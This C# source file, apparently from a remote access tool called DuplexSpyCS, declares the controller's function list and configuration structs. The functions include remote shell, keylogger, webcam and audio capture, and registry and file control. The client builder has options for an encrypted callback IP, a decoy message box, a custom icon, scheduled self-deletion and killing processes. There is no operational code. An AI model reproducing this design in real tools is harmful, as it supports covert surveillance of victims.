using System.Diagnostics;
using System.Net;

namespace DuplexSpyCS
{
    public enum Function
    {
        //INFORMATION
        Information,
        ClientConfig,

        //SYSTEM
        System,

        //MANAGEMENT
        Manager,

        TextEditor,
        FileImage,
        FileNewItem,
        FileDelState,
        FileExec,
        FilePaste,
        FileArchive,
        FileFind,

        RegAddKey,
        RegDeleteKey,
        RegRenameKey,

        RegAddValue,
        RegDeleteValue,
        RegRenameValue,

        RegExport,
        RegImport,

        RegFind,

        Shell,
        Desktop,
        Webcam,
        Audio,
        FunStuff,
        Misc,
        WMI,

        //MICS
        KeyLogger,
        Chat,
        RunScript,

        //BATCH
        MultiDesktop,
        MultiWebcam,

        //OTHER
        TransferFileState,
        Logs,
    };
    public enum TransferFileType
    {
        Upload,
        Download,
    }
    public enum ColorStyleMode
    {
        LightMode,
        DarkMode,
        DarkModeGreenText,
        DarkModeBlueText,
    }
    public enum ArchiveAction
    {
        Compress,
        Extract,
    }

    //Build
    public enum ClientType
    {
        Merged,
        Small,
    };
    public enum ClientLanguage
    {
        CSharp,
        Cpp,
    }

    public class C3
    {
        public static Dictionary<ColorStyleMode, Dictionary<string, Color>> dic_ColorModeStylee = new Dictionary<ColorStyleMode, Dictionary<string, Color>>()
        {
            {
                ColorStyleMode.LightMode, new Dictionary<string, Color>()
                {
                    { "back", SystemColors.Control },
                    { "fore", Color.Black },
                }
            },
            {
                ColorStyleMode.DarkMode, new Dictionary<string, Color>()
                {
                    { "back", Color.Black },
                    { "fore", Color.White },
                }
            },
            {
                ColorStyleMode.DarkModeBlueText, new Dictionary<string, Color>()
                {
                    { "back", Color.Black },
                    { "fore", Color.FromArgb(192, 192, 255) },
                }
            },
            {
                ColorStyleMode.DarkModeGreenText, new Dictionary<string, Color>()
                {
                    { "back", Color.Black },
                    { "fore", Color.LimeGreen },
                }
            }
        };
    }

    public struct MsgBoxConfig
    {
        public string context;
        public string caption;
        public MessageBoxButtons button;
        public MessageBoxIcon icon;
    }

    //Configuration struct

    public struct FileMgrConfig
    {
        public FileMgrConfig()
        {

        }

        private IniManager ini_manager = C2.ini_manager;

        //General
        public int RequestTimeout => int.Parse(ini_manager.Read("FileMgr", "timeout"));
        public int cntThread => int.Parse(ini_manager.Read("FileMgr", "thread"));

        //Scan directory
        public int MaxCountFolder => int.Parse(ini_manager.Read("FileMgr", "max_folder")); //Maximum fodler count display in ListView
        public int MaxCountFile => int.Parse(ini_manager.Read("FileMgr", "max_file")); //Maximum file count display in ListView

        //File transfer
        public int dfChunkSize => int.Parse(ini_manager.Read("FileMgr", "df_size")); //Chunk size (KB)
        public int ufChunkSize => int.Parse(ini_manager.Read("FileMgr", "uf_size")); //Chunk size (KB)
    }
    public struct RegConfig
    {
        public RegConfig()
        {
            IniManager ini_manager = C2.ini_manager;
            if (ini_manager == null)
            {
                MessageBox.Show("ini_manager is null", "FileMgrConfig", MessageBoxButtons.OK, MessageBoxIcon.Error);
                throw new Exception("Null ini_manager");
            }

            RequestTimeout = int.Parse(ini_manager.Read("RegEdit", "timeout"));

            MaxCountKey = int.Parse(ini_manager.Read("RegEdit", "max_key"));
            MaxCountValue = int.Parse(ini_manager.Read("RegEdit", "max_value"));
        }

        //General
        public int RequestTimeout;

        //Scan key
        public int MaxCountKey;
        public int MaxCountValue;
    }
    public struct TaskMgrConfig
    {
        public TaskMgrConfig()
        {
            IniManager ini_manager = C2.ini_manager;
            if (ini_manager == null)
            {
                MessageBox.Show("ini_manager is null", "FileMgrConfig", MessageBoxButtons.OK, MessageBoxIcon.Error);
                throw new Exception("Null ini_manager");
            }

            avJson = ini_manager.Read("TaskMgr", "AVjson");
        }

        public string avJson; //Anti-Virus json
    }
    public struct ServConfig
    {
        public ServConfig()
        {
            IniManager ini_manager = C2.ini_manager;
            if (ini_manager == null)
            {
                MessageBox.Show("ini_manager is null", "FileMgrConfig", MessageBoxButtons.OK, MessageBoxIcon.Error);
                throw new Exception("Null ini_manager");
            }

            avJson = ini_manager.Read("ServMgr", "AVjson");
        }

        public string avJson; //Anti-Virus json
    }

    //Build client config
    public struct BuildConfig
    {
        public string szIP;
        public int dwPort;
        public int dwTimeout; //Milisecond
        public int dwRetry; //Milisecond

        public bool bEncryptIP; //Encrypt IP

        public string szServName;
        public string szServInfo;

        public bool bMsgBox; //Enable message box.
        public MsgBoxConfig msgboxConfig;

        public bool bIcon;
        public Image icon;

        public bool bDelete;
        public DateTime dtDelete;

        public ClientType clntType;
        public ClientLanguage clntLang;
    }

    public struct SettingConfig
    {
        /// <summary>
        /// Listen port number.
        /// </summary>
        public int dwListenPort;

        /// <summary>
        /// Sqlite database file path.
        /// </summary>
        public string szDbFile;

        /// <summary>
        /// Socket send/receive timeout.
        /// </summary>
        public int dwTimeout;

        /// <summary>
        /// Time interval of display received byte.
        /// </summary>
        public int dwShowReceived;
        public int dwShowSent;

        public DateTime dtLogs;

        public int fileMgr_dwThread;
        public int fileMgr_dwMaxFolder;
        public int fileMgr_dwMaxFile;
        public int fileMgr_dwTimeout;
        public int fileMgr_dwUfChunkSize;
        public int fileMgr_dwDfChunkSize;

        public bool fileMgr_bMaxFolder;
        public bool fileMgr_bMaxFile;

        //Shell
        public string shell_szExec;
        public bool shell_bHistory;
        public string shell_szHistory;

        //Monitor
        public bool monitor_bShowDate;
        public int monitor_dwQuality;

        //Webcam
        public bool webcam_bShowDate;
        public int webcam_dwQuality;

        //FunStuff
        public string msgbox_szCaption;
        public string msgbox_szText;

        public string szLockScreenDir;
        public string szWallpaperDir;
        public string szSpeakText;

        //Crypto
        public string crypto_szChallengeText;
        public bool crypto_bRandomChallenge;
        public int crypto_dwChallengeLength;

        //TaskMgr
        public string taskMgr_szAVjson;
        public bool bGetChildProcess;

        //ServMgr
        public string servMgr_szAVjson;

        //RegEdit
        public int reg_dwMaxKey;
        public int reg_dwMaxValue;

        public bool reg_bMaxKey;
        public bool reg_bMaxValue;
    }

    public struct BasicInfo
    {
        public string szOnlineID;
        public string szUsername;
        public bool bIsAdmin;
        public string szOS;
        public int dwPing;
        public string szCPU;
        public int dwMonitorCount;
        public int dwWebcamCount;
        public string szActiveWindowTitle;
        public Image imgScreenshot;
    }

    public struct ClientConfig
    {
        public int dwTimeout;
        public int dwRetry;

        public List<string> ls_szKillProcess;
        public bool bKillProcess;
    }

    public struct ClientInfo
    {
        public string szDnsHostName => Dns.GetHostName();
        public string szStartupPath => Application.StartupPath;
        public string szCurrentProcName => Process.GetCurrentProcess().ProcessName;
        public string szMachineName => Environment.MachineName;
        public string szUsername => Environment.UserName;
        public string szUserDomainName => Environment.UserDomainName;
        public string szOS;

        /// <summary>
        /// Key: Monitor name.
        /// Value: Monitor rectangle
        /// </summary>
        private Dictionary<string, Rectangle> _ls_Monitor;

        public Dictionary<string, Rectangle> ls_Monitor
        {
            get
            {
                if (_ls_Monitor == null)
                {
                    _ls_Monitor = new Dictionary<string, Rectangle>();
                }

                _ls_Monitor.Clear();

                foreach (Screen screen in Screen.AllScreens)
                {
                    _ls_Monitor[screen.DeviceName] = screen.WorkingArea;
                }

                return _ls_Monitor;
            }
        }

        /* Key: Webcam name
         * Value: Webcam rectangle(size) */

        public List<string> ls_Webcam;
    }
}